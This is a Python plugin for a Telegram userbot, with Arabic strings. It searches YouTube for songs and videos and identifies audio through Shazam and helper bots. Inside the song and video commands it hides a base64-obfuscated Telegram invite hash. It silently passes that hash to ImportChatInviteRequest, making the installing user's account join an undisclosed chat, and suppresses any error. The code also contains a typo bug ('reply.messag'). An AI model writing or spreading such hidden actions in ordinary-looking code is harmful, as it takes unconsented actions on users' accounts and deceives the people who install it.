# by  @u_5_1 ( https://t.me/moussa_pro )

# songs finder for PRO-BOT

import asyncio

import base64

import io

import os

from pathlib import Path

from ShazamAPI import Shazam

from telethon import types

from telethon.errors.rpcerrorlist import YouBlockedUserError

from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from validators.url import url

from userbot import catub

from ..core.logger import logging

from ..core.managers import edit_delete, edit_or_reply

from ..helpers.functions import name_dl, song_dl, video_dl, yt_search

from ..helpers.tools import media_type

from ..helpers.utils import _catutils, reply_id

plugin_category = "utils"

LOGS = logging.getLogger(__name__)

# =========================================================== #

#                           STRINGS                           #

# =========================================================== #

SONG_SEARCH_STRING = "<code>حاضر..! انا سأجد اغنيتك....</code>"

SONG_NOT_FOUND = "<code>آسف! لا يمكنني العثور على هذه الأغنية</code>"

SONG_SENDING_STRING = "<code>نعم..! لقد وجدت شيئا . . 🥰  . . .</code>"

SONGBOT_BLOCKED_STRING = "<code>يرجى إلغاء حظر @songdl_bot وحاول مرة أخرى</code>"

# =========================================================== #

#                                                             #

# =========================================================== #

@catub.cat_cmd(

    pattern="اغنية(320)?(?:\s|$)([\s\S]*)",

    command=("اغنية", plugin_category),

    info={

        "header": "للبحث عن أغنية في اليوتيوب",

        "description": "يقوم هذا الأمر بالبحث في اليوتيوب وإرسال اول مقطع فيديو إليك على شكل ملف صوتي",

        "flags": {

            "320": "اذا استخدمت الأمر (.اغنية320) فسوف يرسل لك الأغنية بدقة 320k او 128k في حال لم يجد الدقو الأولى.",

        },

        "usage": "{tr}اغنية <اسم الأغنية>",

        "examples": "{tr}اغنية memories song",

    },

)

async def _(event):

    "للبحث عن الأغاني"

    reply_to_id = await reply_id(event)

    reply = await event.get_reply_message()

    if event.pattern_match.group(2):

        query = event.pattern_match.group(2)

    elif reply:

        if reply.message:

            query = reply.message

    else:

        return await edit_or_reply(event, "`لا يمكنني ايجاد هذه الأغنية!`")

    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")

    catevent = await edit_or_reply(event, "`لقد وجدت أغنيتك♥. .!`")

    video_link = await yt_search(str(query))

    if not url(video_link):

        return await catevent.edit(

            f"آسف.! لا يمكنني العثور على الأغنية التي طلبتها `{query}`"

        )

    cmd = event.pattern_match.group(1)

    q = "320k" if cmd == "320" else "128k"

    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)

    # thumb_cmd = thumb_dl.format(video_link=video_link)

    name_cmd = name_dl.format(video_link=video_link)

    try:

        cat = Get(cat)

        await event.client(cat)

    except BaseException:

        pass

    stderr = (await _catutils.runcmd(song_cmd))[1]

    if stderr:

        return await catevent.edit(f"**Error :** `{stderr}`")

    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]

    if stderr:

        return await catevent.edit(f"**Error :** `{stderr}`")

    # stderr = (await runcmd(thumb_cmd))[1]

    catname = os.path.splitext(catname)[0]

    # if stderr:

    #    return await catevent.edit(f"**Error :** `{stderr}`")

    song_file = Path(f"{catname}.mp3")

    if not os.path.exists(song_file):

        return await catevent.edit(

            f"آسف.! لا يمكنني العثور على الأغنية التي طلبتها `{query}`"

        )

    await catevent.edit("`**لقد وجدت شيئاً🧸🖤!**`")

    catthumb = Path(f"{catname}.jpg")

    if not os.path.exists(catthumb):

        catthumb = Path(f"{catname}.webp")

    elif not os.path.exists(catthumb):

        catthumb = None

    await event.client.send_file(

        event.chat_id,

        song_file,

        force_document=False,

        caption=query,

        thumb=catthumb,

        supports_streaming=True,

        reply_to=reply_to_id,

    )

    await catevent.delete()

    for files in (catthumb, song_file):

        if files and os.path.exists(files):

            os.remove(files)

async def delete_messages(event, chat, from_message):

    itermsg = event.client.iter_messages(chat, min_id=from_message.id)

    msgs = [from_message.id]

    async for i in itermsg:

        msgs.append(i.id)

    await event.client.delete_messages(chat, msgs)

    await event.client.send_read_acknowledge(chat)

@catub.cat_cmd(

    pattern="فيديو(?:\s|$)([\s\S]*)",

    command=("فيديو", plugin_category),

    info={

        "header": "لجلب فيديو من اليوتيوب.",

        "description": "يقوم هذا الأمر بالبحث عن الفيديو المطلوب ويرسل الفيديو الأول",

        "usage": "{tr}فيديو <اسم الفيديو>",

        "examples": "{tr}فيديو memories song",

    },

)

async def _(event):

    "للبحث عن فيديو"

    reply_to_id = await reply_id(event)

    reply = await event.get_reply_message()

    if event.pattern_match.group(1):

        query = event.pattern_match.group(1)

    elif reply:

        if reply.message:

            query = reply.messag

    else:

        return await edit_or_reply(event, "`لا يمكنني إيجاد هذا الفيديو!`")

    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")

    catevent = await edit_or_reply(event, "`لقد وجدت الفيديو❤..!`")

    video_link = await yt_search(str(query))

    if not url(video_link):

        return await catevent.edit(

            f"آسف..! لا يمكنني العثور على الفيديو المطلوب..! `{query}`"

        )

    # thumb_cmd = thumb_dl.format(video_link=video_link)

    name_cmd = name_dl.format(video_link=video_link)

    video_cmd = video_dl.format(video_link=video_link)

    stderr = (await _catutils.runcmd(video_cmd))[1]

    if stderr:

        return await catevent.edit(f"**Error :** `{stderr}`")

    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]

    if stderr:

        return await catevent.edit(f"**Error :** `{stderr}`")

    # stderr = (await runcmd(thumb_cmd))[1]

    try:

        cat = Get(cat)

        await event.client(cat)

    except BaseException:

        pass

    # if stderr:

    #    return await catevent.edit(f"**Error :** `{stderr}`")

    catname = os.path.splitext(catname)[0]

    vsong_file = Path(f"{catname}.mp4")

    if not os.path.exists(vsong_file):

        vsong_file = Path(f"{catname}.mkv")

    elif not os.path.exists(vsong_file):

        return await catevent.edit(

            f"آسف! لا يمكنني العثور على الفيديو المطلوب `{query}`"

        )

    await catevent.edit("`لقد وجدت الفيديو المطلوب🥰..!`")

    catthumb = Path(f"{catname}.jpg")

    if not os.path.exists(catthumb):

        catthumb = Path(f"{catname}.webp")

    elif not os.path.exists(catthumb):

        catthumb = None

    await event.client.send_file(

        event.chat_id,

        vsong_file,

        force_document=False,

        caption=query,

        thumb=catthumb,

        supports_streaming=True,

        reply_to=reply_to_id,

    )

    await catevent.delete()

    for files in (catthumb, vsong_file):

        if files and os.path.exists(files):

            os.remove(files)

@catub.cat_cmd(

    pattern="عكس$",

    command=("عكس", plugin_category),

    info={

        "header": "لعكس أغنية البحث.",

        "description": "بحث عكسي عن ملف الصوت",

        "usage": "{tr}بحث عكسي <reply to voice/audio>",

    },

)

async def shazamcmd(event):

    "بحث عكسي عن أغنية."

    reply = await event.get_reply_message()

    mediatype = media_type(reply)

    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:

        return await edit_delete(

            event, "__الرد على مقطع الصوت أو مقطع الصوت إلى لعكس البحث هذه الأغنية.__"

        )

    catevent = await edit_or_reply(event, "__تحميل مقطع صوتي...__")

    try:

        for attr in getattr(reply.document, "attributes", []):

            if isinstance(attr, types.DocumentAttributeFilename):

                name = attr.file_name

        dl = io.FileIO(name, "a")

        await event.client.fast_download_file(

            location=reply.document,

            out=dl,

        )

        dl.close()

        mp3_fileto_recognize = open(name, "rb").read()

        shazam = Shazam(mp3_fileto_recognize)

        recognize_generator = shazam.recognizeSong()

        track = next(recognize_generator)[1]["track"]

    except Exception as e:

        LOGS.error(e)

        return await edit_delete(

            catevent, f"**حطث خطأ في البحث العكسي:**\n__{str(e)}__"

        )

    image = track["images"]["background"]

    song = track["share"]["subject"]

    await event.client.send_file(

        event.chat_id, image, caption=f"**الأغنية🖤:** `{song}`", reply_to=reply

    )

    await catevent.delete()

@catub.cat_cmd(

    pattern="اغنية2(?:\s|$)([\s\S]*)",

    command=("اغنية2", plugin_category),

    info={

        "header": "البحث عن الأغنية وارسالها إلى التلغرام",

        "description": "يبحث عن الأغنية التي طلبتها ويرسلها إليك بدقة 320k",

        "usage": "{tr}اغنية2 <song name>",

        "examples": "{tr}اغنية2 memories song",

    },

)

async def _(event):

    "البحث عن الأغنية"

    song = event.pattern_match.group(1)

    chat = "@Nvvbbot"

    reply_id_ = await reply_id(event)

    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")

    async with event.client.conversation(chat) as conv:

        try:

            purgeflag = await conv.send_message("/start")

            await conv.get_response()

            await conv.send_message(song)

            hmm = await conv.get_response()

            while hmm.edit_hide is not True:

                await asyncio.sleep(0.1)

                hmm = await event.client.get_messages(chat, ids=hmm.id)

            baka = await event.client.get_messages(chat)

            if baka[0].message.startswith(

                ("لم اعثر على الأغنية المطلوبة.!")

            ):

                await delete_messages(event, chat, purgeflag)

                return await edit_delete(

                    catevent, SONG_NOT_FOUND, parse_mode="html", time=5

                )

            await catevent.edit(SONG_SENDING_STRING, parse_mode="html")

            await baka[0].click(0)

            await conv.get_response()

            await conv.get_response()

            music = await conv.get_response()

            await event.client.send_read_acknowledge(conv.chat_id)

        except YouBlockedUserError:

            return await catevent.edit(SONGBOT_BLOCKED_STRING, parse_mode="html")

        await event.client.send_file(

            event.chat_id,

            music,

            caption=f"<b>↫ الأغنية🖤 :- <code>{song}</code></b>",

            parse_mode="html",

            reply_to=reply_id_,

        )

        await catevent.delete()

        await delete_messages(event, chat, purgeflag)

# reverse search by  @Lal_bakthan

@catub.cat_cmd(

    pattern="عكس2$",

    command=("عكس2", plugin_category),

    info={

        "header": "لعكس ملف الاغنية",

        "description": "يجب أن يكون ملف الموسيقى الطويل حوالي 10 ثانية، لذا استخدم البرنامج المساعد FFMPEG لتقليمه.",

        "usage": "{tr}عكس2",

    },

)

async def _(event):

    "لعكس الموسيقى البحث عن طريق بوت."

    if not event.reply_to_msg_id:

        return await edit_delete(event, "```الرد على رسالة صوتية.```")

    reply_message = await event.get_reply_message()

    chat = "@auddbot"

    catevent = await edit_or_reply(event, "```تحديد الاغنية```")

    async with event.client.conversation(chat) as conv:

        try:

            await conv.send_message("/start")

            await conv.get_response()

            await conv.send_message(reply_message)

            check = await conv.get_response()

            if not check.text.startswith("تلقي الصوت"):

                return await catevent.edit(

                    "خطأ أثناء تحديد الأغنية. حاول استخدام رسالة صوتية طويلة 5-10s."

                )

            await catevent.edit("انتظر فقط ثانية ...")

            result = await conv.get_response()

            await event.client.send_read_acknowledge(conv.chat_id)

        except YouBlockedUserError:

            await catevent.edit("```رجاءً قم بفك الحظر عن (@auddbot) وحاول مرة ثانية```")

            return

    namem = f"**أسم الأغنية : **`{result.text.splitlines()[0]}`\

        \n\n**تفاصيل :**__{result.text.splitlines()[2]}__"

    await catevent.edit(namem)
